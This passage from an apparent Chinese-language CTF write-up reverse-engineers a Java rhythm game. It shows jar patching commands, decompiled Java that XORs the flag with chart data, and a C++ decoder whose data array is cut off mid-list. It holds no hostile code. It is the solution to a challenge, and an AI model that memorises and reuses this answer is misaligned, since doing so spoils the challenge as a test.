<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># Extract</span></span><br><span class="line">jar -ef Fallen_Beat.jar</span><br><span class="line"><span class="comment"># Update class to jar file</span></span><br><span class="line">jar -uf Fallen_Beat.jar ./Control/GameControl.class</span><br></pre></td></tr></table></figure>
<p><img src="https://i.imgur.com/jssJ9z6.png" alt=""></p>
<h4 id="static"><a href="#static" class="headerlink" title="static"></a>static</h4><p>此題還可以分析程式碼，可以發現 flag 最後是用 <code>this.cache</code> 做 XOR</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// Inside public void setValue(int t, int c2, int e, int l, int m, int mc, String info, ArrayList&lt;Integer&gt; cache)</span></span><br><span class="line"><span class="comment">// from Visual.PanelEnding:156</span></span><br><span class="line"><span class="comment">// t = total notes</span></span><br><span class="line"><span class="comment">// mc = max combo</span></span><br><span class="line"><span class="keyword">if</span> (t == mc) &#123;</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; cache.size(); i++) &#123;</span><br><span class="line">        <span class="keyword">byte</span>[] bArr = <span class="keyword">this</span>.flag;</span><br><span class="line">        <span class="keyword">int</span> length = i % <span class="keyword">this</span>.flag.length;</span><br><span class="line">        bArr[length] = (<span class="keyword">byte</span>) (cache.get(i).intValue() ^ bArr[length]);</span><br><span class="line">    &#125;</span><br><span class="line">    String fff = <span class="keyword">new</span> String(<span class="keyword">this</span>.flag);</span><br><span class="line">    <span class="keyword">this</span>.text[<span class="number">0</span>].setText(String.format(<span class="string">"Flag: %s"</span>, <span class="keyword">new</span> Object[]&#123;fff&#125;));</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>繼續追，可以發現 <code>this.cache</code> 是在 <code>Control.GameControl:131</code> 被新增元素的</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// from Control.GameControl:131</span></span><br><span class="line"><span class="keyword">this</span>.cache = <span class="keyword">new</span> ArrayList&lt;&gt;();</span><br><span class="line"><span class="keyword">int</span>[] bounds = &#123;<span class="number">1</span>, <span class="number">111</span>, <span class="number">223</span>, <span class="number">334</span>, <span class="number">36</span>&#125;;</span><br><span class="line"><span class="keyword">while</span> (br.ready()) &#123;</span><br><span class="line">    String s = br.readLine();</span><br><span class="line">    <span class="keyword">if</span> (s.charAt(<span class="number">0</span>) != <span class="string">'*'</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">int</span> a = Integer.parseInt(s);</span><br><span class="line">        <span class="keyword">this</span>.cache.add(Integer.valueOf(a));</span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; <span class="number">5</span>; i++)</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="keyword">if</span> (((a &gt;&gt; i) &amp; <span class="number">1</span>) == <span class="number">1</span>)</span><br><span class="line">            &#123;</span><br><span class="line">                <span class="keyword">if</span> (i != <span class="number">4</span>)</span><br><span class="line">                &#123;</span><br><span class="line">                    <span class="keyword">this</span>.note = <span class="keyword">new</span> JLabel(<span class="keyword">this</span>.bt);</span><br><span class="line">                    <span class="keyword">this</span>.note.setBounds(bounds[i], <span class="keyword">this</span>.y, <span class="number">100</span>, <span class="number">40</span>);</span><br><span class="line">                &#125;</span><br><span class="line">                <span class="keyword">else</span></span><br><span class="line">                &#123;</span><br><span class="line">                    <span class="keyword">this</span>.note = <span class="keyword">new</span> JLabel(<span class="keyword">this</span>.fx);</span><br><span class="line">                    <span class="keyword">this</span>.note.setBounds(bounds[i], <span class="keyword">this</span>.y, <span class="number">350</span>, <span class="number">40</span>);</span><br><span class="line">                &#125;</span><br><span class="line">                <span class="keyword">this</span>.pFumen.add(<span class="keyword">this</span>.note);</span><br><span class="line">                <span class="keyword">this</span>.check.get(i).add(Integer.valueOf(<span class="keyword">this</span>.y));</span><br><span class="line">                <span class="keyword">this</span>.total++;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">this</span>.y += <span class="keyword">this</span>.distance;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>最後發現 <code>cache</code> 是<a href="https://pastebin.com/yipwnxkq" target="_blank" rel="noopener">譜面</a>的數字</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// from Control.GameControl:94</span></span><br><span class="line">FileReader fr = <span class="keyword">new</span> FileReader(fumenPath);</span><br><span class="line">BufferedReader br = <span class="keyword">new</span> BufferedReader(fr);</span><br><span class="line"><span class="keyword">this</span>.bpm = Integer.parseInt(br.readLine());</span><br></pre></td></tr></table></figure>
<p>根據剛剛分析的邏輯後可以寫個程式把 flag 轉回來</p>
<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;bits/stdc++.h&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> <span class="built_in">std</span>;</span><br><span class="line"><span class="comment">// from Visual.PanelEnding</span></span><br><span class="line"><span class="built_in">vector</span>&lt;<span class="keyword">char</span>&gt; flag = &#123;<span class="number">89</span>,<span class="number">74</span>,<span class="number">75</span>,<span class="number">43</span>,<span class="number">126</span>,<span class="number">69</span>,<span class="number">120</span>,<span class="number">109</span>,<span class="number">68</span>,<span class="number">109</span>,<span class="number">109</span>,<span class="number">97</span>,<span class="number">73</span>,<span class="number">110</span>,<span class="number">45</span>,<span class="number">113</span>,<span class="number">102</span>,<span class="number">64</span>,<span class="number">121</span>,<span class="number">47</span>,<span class="number">111</span>,<span class="number">119</span>,<span class="number">111</span>,<span class="number">71</span>,<span class="number">114</span>,<span class="number">125</span>,<span class="number">68</span>,<span class="number">105</span>,<span class="number">127</span>,<span class="number">124</span>,<span class="number">94</span>,<span class="number">103</span>,<span class="number">46</span>,<span class="number">107</span>,<span class="number">97</span>,<span class="number">104</span>&#125;;</span><br><span class="line"><span class="built_in">vector</span>&lt;<span class="keyword">int</span>&gt; v = &#123;<span class="number">1</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">28</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">14</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">28</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">14</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">12</span>, <span class="number">6</span>, <span class="number">24</span>, <span class="number">6</span>, <span class="number">24</span>, <span class="number">12</span>, <span class="number">24</span>, <span class="number">6</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">18</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">6</span>, <span class="number">24</span>, <span class="number">12</span>, <span class="number">24</span>, <span class="number">6</span>, <span class="number">12</span>, <span class="number">6</span>, <span class="number">0</span>, <span class="number">12</span>, <span class="number">6</span>, <span class="number">0</span>, <span class="number">17</span>, <span class="number">0</span>, <span class="number">6</span>, <span class="number">12</span>, <span class="number">24</span>, <span class="number">6</span>, <span class="number">24</span>, <span class="number">6</span>, <span class="number">24</span>, <span class="number">6</span>, <span class="number">12</span>, <span class="number">6</span>, <span class="number">0</span>, <span class="number">12</span>, <span class="number">6</span>, <span class="number">0</span>, <span class="number">17</span>, <span class="number">0</span>, <span class="number">6</span>, <span class="number">12</span>, <span class="number">24</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">12</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">3</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">3</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">17</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">17</span>, <span class="number">0</span>, <span class="number">10</span>, <span class="number">0</span>, <span class="number">20</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">9</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">9</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">5</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">5</span>, <span class="number">24</span>, <span class="number">6</span>, <span class="number">12</span>, <span class="number">6</span>, <span class="number">24</span>, <span class="number">12</span>, <span class="number">24</span>, <span class="number">0</span>, <span class="number">12</span>, <span class="number">24</span>, <span class="number">0</span>, <span class="number">3</span>, <span class="number">0</span>, <span class="number">24</span>, <span class="number">12</span>, <span class="number">6</span>, <span class="number">24</span>, <span class="number">6</span>, <span class="number">24</span>, <span class="number">6</span>, <span class="number">24</span>, <span class="number">12</span>, <span class="number">24</span>, <span class="number">0</span>, <span class="number">12</span>, <span class="number">24</span>, <span class="number">0</span>, <span class="number">3</span>, <span class="number">0</span>, <span class="number">24</span>, <span class="number">12</span>, <span class="number">6</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">3</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">3</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">17</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">17</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">2</span>, <span class="number">4</span>, <span class="number">8</span>, <span class="number">16</span>, <span class="number">8</span>, <span class="number">4</span>, <span class="number">2</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">12</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">18</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">12</span>, <span class="number">2</span>, <span class="number">4</span>, <span class="number">8</span>, <span class="number">1</span>, <span class="number">8</span>, <span class="number">4</span>, <span class="number">2</span>, <span class="number">0</span>, <span class="number">16</span>, <span class="number">8</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">16</span>, <span class="number">8</span>, <span class="number">16</span>, <span class="number">2</span>, <span class="number">4</span>, <span class="number">8</span>, <span class="number">1</span>, <span class="number">8</span>, <span class="number">4</span>, <span class="number">2</span>, <span class="number">0</span>, <span class="number">16</span>, <span class="number">8</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">16</span>, <span class="number">8</span>, <span class="number">16</span>, <span class="number">0</span>, <span class="number">18</span>, <span class="number">0</span>, <span class="number">18</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">14</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">14</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">28</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">28</span>, <span class="number">0</span>, <span class="number">4</span>, <span class="number">0</span>, <span class="number">8</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">28</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">28</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">14</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">14</span>, <span class="number">16</span>, <span class="number">8</span>, <span class="number">4</span>, <span class="number">1</span>, <span class="number">4</span>, <span class="number">8</span>, <span class="number">16</span>, <span class="number">0</span>, <span class="number">2</span>, <span class="number">4</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">2</span>, <span class="number">4</span>, <span class="number">2</span>, <span class="number">16</span>, <span class="number">8</span>, <span class="number">4</span>, <span class="number">1</span>, <span class="number">4</span>, <span class="number">8</span>, <span class="number">16</span>, <span class="number">0</span>, <span class="number">2</span>, <span class="number">4</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">2</span>, <span class="number">4</span>, <span class="number">2</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">30</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">18</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">12</span>, <span class="number">0</span>, <span class="number">18</span>, <span class="number">8</span>, <span class="number">16</span>, <span class="number">0</span>, <span class="number">18</span>, <span class="number">4</span>, <span class="number">2</span>, <span class="number">0</span>, <span class="number">18</span>, <span class="number">8</span>, <span class="number">16</span>, <span class="number">0</span>, <span class="number">18</span>, <span class="number">4</span>, <span class="number">2</span>, <span class="number">0</span>, <span class="number">18</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">8</span>, <span class="number">16</span>, <span class="number">8</span>, <span class="number">16</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">4</span>, <span class="number">2</span>, <span class="number">4</span>, <span class="number">2</span>, <span class="number">1</span>, <span class="number">16</span>, <span class="number">1</span>, <span class="number">16</span>, <span class="number">4</span>, <span class="number">8</span>, <span class="number">4</span>, <span class="number">18</span>, <span class="number">8</span>, <span class="number">0</span>, <span class="number">2</span>, <span class="number">16</span>, <span class="number">4</span>, <span class="number">8</span>, <span class="number">0</span>, <span class="number">18</span>, <span class="number">8</span>, <span class="number">4</span>, <span class="number">0</span>, <span class="number">2</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">16</span>, <span class="number">1</span>, <span class="number">16</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">2</span>, <span class="number">1</span>, <span class="number">2</span>, <span class="number">1</span>, <span class="number">8</span>, <span class="number">4</span>, <span class="number">8</span>, <span class="number">18</span>, <span class="number">8</span>, <span class="number">4</span>, <span class="number">8</span>, <span class="number">18</span>, <span class="number">4</span>, <span class="number">0</span>, <span class="number">16</span>, <span class="number">2</span>, <span class="number">8</span>, <span class="number">4</span>, <span class="number">0</span>, <span class="number">10</span>, <span class="number">0</span>, <span class="number">8</span>, <span class="number">0</span>, <span class="number">8</span>, <span class="number">2</span>, <span class="number">16</span>, <span class="number">2</span>, <span class="number">16</span>, <span class="number">12</span>, <span class="number">0</span>, <span class="number">6</span>, <span class="number">16</span>, <span class="number">8</span>, <span class="number">2</span>, <span class="number">0</span>, <span class="number">4</span>, <span class="number">16</span>, <span class="number">8</span>, <span class="number">4</span>, <span class="number">18</span>, <span class="number">4</span>, <span class="number">16</span>, <span class="number">4</span>, <span class="number">18</span>, <span class="number">8</span>, <span class="number">0</span>, <span class="number">2</span>, <span class="number">16</span>, <span class="number">4</span>, <span class="number">8</span>, <span class="number">0</span>, <span class="number">20</span>, <span class="number">0</span>, <span class="number">18</span>, <span class="number">0</span>, <span class="number">12</span>, <span class="number">0</span>, <span class="number">12</span>, <span class="number">0</span>, <span class="number">2</span>, <span class="number">4</span>, <span class="number">2</span>, <span class="number">4</span>, <span class="number">2</span>, <span class="number">4</span>, <span class="number">2</span>, <span class="number">4</span>, <span class="number">2</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">2</span>, <span class="number">8</span>, <span class="number">2</span>, <span class="number">8</span>, <span class="number">4</span>, <span class="number">16</span>, <span class="number">4</span>, <span class="number">16</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">24</span>, <span class="number">0</span>, <span class="number">20</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">12</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">2</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">6</span>, <span class="number">0</span>, <span class="number">10</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">12</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">16</span>, <span class="number">0</span>, <span class="number">18</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">20</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">24</span>, <span class="number">0</span>, <span class="number">6</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">10</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">18</span>, <span class="number">0</span>, <span class="number">10</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">10</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">20</span>, <span class="number">0</span>, <span class="number">2</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">12</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">3</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">20</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">20</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">10</span>, <span class="number">0</span>, <span class="number">16</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">12</span>, <span class="number">0</span>, <span class="number">17</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">10</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">10</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">20</span>, <span class="number">0</span>, <span class="number">2</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">12</span>, <span class="number">0</span>, <span class="number">3</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">18</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">8</span>, <span class="number">16</span>, <span class="number">8</span>, <span class="number">16</span>, <span class="number">8</span>, <span class="number">16</span>, <span class="number">8</span>, <span class="number">16</span>, <span class="number">4</span>, <span class="number">2</span>, <span class="number">4</span>, <span class="number">2</span>, <span class="number">4</span>, <span class="number">2</span>, <span class="number">4</span>, <span class="number">2</span>, <span class="number">0</span>, <span class="number">17</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">3</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">17</span>, <span class="number">0</span>, <span class="number">8</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">4</span>, <span class="number">8</span>, <span class="number">4</span>, <span class="number">8</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">8</span>, <span class="number">4</span>, <span class="number">8</span>, <span class="number">4</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">10</span>, <span class="number">0</span>, <span class="number">20</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">10</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">20</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">16</span>, <span class="number">0</span>, <span class="number">9</span>, <span class="number">0</span>, <span class="number">4</span>, <span class="number">0</span>, <span class="number">3</span>, <span class="number">0</span>, <span class="number">4</span>, <span class="number">0</span>, <span class="number">9</span>, <span class="number">0</span>, <span class="number">16</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">30</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">30</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">2</span>, <span class="number">0</span>, <span class="number">17</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">5</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">9</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">3</span>, <span class="number">0</span>, <span class="number">4</span>, <span class="number">0</span>, <span class="number">8</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">9</span>, <span class="number">0</span>, <span class="number">4</span>, <span class="number">0</span>, <span class="number">2</span>, <span class="number">0</span>, <span class="number">4</span>, <span class="number">0</span>, <span class="number">8</span>, <span class="number">0</span>, <span class="number">16</span>, <span class="number">0</span>, <span class="number">8</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">5</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">3</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">5</span>, <span class="number">0</span>, <span class="number">9</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">5</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">9</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">17</span>, <span class="number">0</span>, <span class="number">8</span>, <span class="number">0</span>, <span class="number">4</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">5</span>, <span class="number">0</span>, <span class="number">8</span>, <span class="number">0</span>, <span class="number">16</span>, <span class="number">0</span>, <span class="number">8</span>, <span class="number">0</span>, <span class="number">4</span>, <span class="number">0</span>, <span class="number">2</span>, <span class="number">0</span>, <span class="number">4</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">9</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">17</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">9</span>, <span class="number">0</span>, <span class="number">5</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">9</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">5</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">3</span>, <span class="number">0</span>, <span class="number">4</span>, <span class="number">0</span>, <span class="number">8</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">6</span>, <span class="number">16</span>, <span class="number">8</span>, <span class="number">4</span>, <span class="number">2</span>, <span class="number">16</span>, <span class="number">8</span>, <span class="number">4</span>, <span class="number">18</span>, <span class="number">0</span>, <span class="number">8</span>, <span class="number">0</span>, <span class="number">18</span>, <span class="number">0</span>, <span class="number">4</span>, <span class="number">0</span>, <span class="number">18</span>, <span class="number">0</span>, <span class="number">11</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">11</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">11</span>, <span class="number">0</span>, <span class="number">21</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">21</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">21</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">20</span>, <span class="number">10</span>, <span class="number">0</span>, <span class="number">10</span>, <span class="number">20</span>, <span class="number">0</span>, <span class="number">20</span>, <span class="number">10</span>, <span class="number">0</span>, <span class="number">10</span>, <span class="number">20</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">18</span>, <span class="number">12</span>, <span class="number">0</span>, <span class="number">12</span>, <span class="number">18</span>, <span class="number">0</span>, <span class="number">18</span>, <span class="number">12</span>, <span class="number">0</span>, <span class="number">12</span>, <span class="number">18</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">6</span>, <span class="number">6</span>, <span class="number">0</span>, <span class="number">24</span>, <span class="number">24</span>, <span class="number">0</span>, <span class="number">6</span>, <span class="number">6</span>, <span class="number">0</span>, <span class="number">24</span>, <span class="number">24</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">10</span>, <span class="number">10</span>, <span class="number">0</span>, <span class="number">20</span>, <span class="number">20</span>, <span class="number">0</span>, <span class="number">10</span>, <span class="number">10</span>, <span class="number">0</span>, <span class="number">20</span>, <span class="number">20</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">10</span>, <span class="number">10</span>, <span class="number">0</span>, <span class="number">20</span>, <span class="number">20</span>, <span class="number">0</span>, <span class="number">10</span>, <span class="number">10</span>, <span class="number">0</span>, <span class="number">20</span>, <span class="number">20</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">6</span>, <span class="number">6</span>, <span class="number">0</span>, <span class="number">24</span>, <span class="number">24</span>, <span class="number">0</span>, <span class="number">6</span>, <span class="number">6</span>, <span class="number">0</span>, <span class="number">24</span>, <span class="number">24</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">17</span>, <span class="number">0</span>, <span class="number">9</span>, <span class="number">0</span>, <span class="number">5</span>, <span class="number">0</span>, <span class="number">3</span>, <span class="number">0</span>, <span class="number">5</span>, <span class="number">0</span>, <span class="number">9</span>, <span class="number">0</span>, <span class="number">17</span>, <span class="number">8</span>, <span class="number">0</span>, <span class="number">4</span>, <span class="number">0</span>, <span class="number">16</span>, <span class="number">0</span>, <span class="number">4</span>, <span class="number">1</span>, <span class="number">4</span>, <span class="number">0</span>, <span class="number">16</span>, <span class="number">0</span>, <span class="number">2</span>, <span class="number">0</span>, <span class="number">8</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">6</span>, <span class="number">0</span>, <span class="number">24</span>, <span class="number">0</span>, <span class="number">25</span>, <span class="number">0</span>, <span class="number">6</span>, <span class="number">0</span>, <span class="number">7</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">8</span>, <span class="number">2</span>, <span class="number">16</span>, <span class="number">4</span>, <span class="number">0</span>, <span class="number">4</span>, <span class="number">16</span>, <span class="number">2</span>, <span class="number">8</span>, <span class="number">0</span>, <span class="number">18</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">24</span>, <span class="number">4</span>, <span class="number">2</span>, <span class="number">0</span>, <span class="number">12</span>, <span class="number">0</span>, <span class="number">6</span>, <span class="number">0</span>, 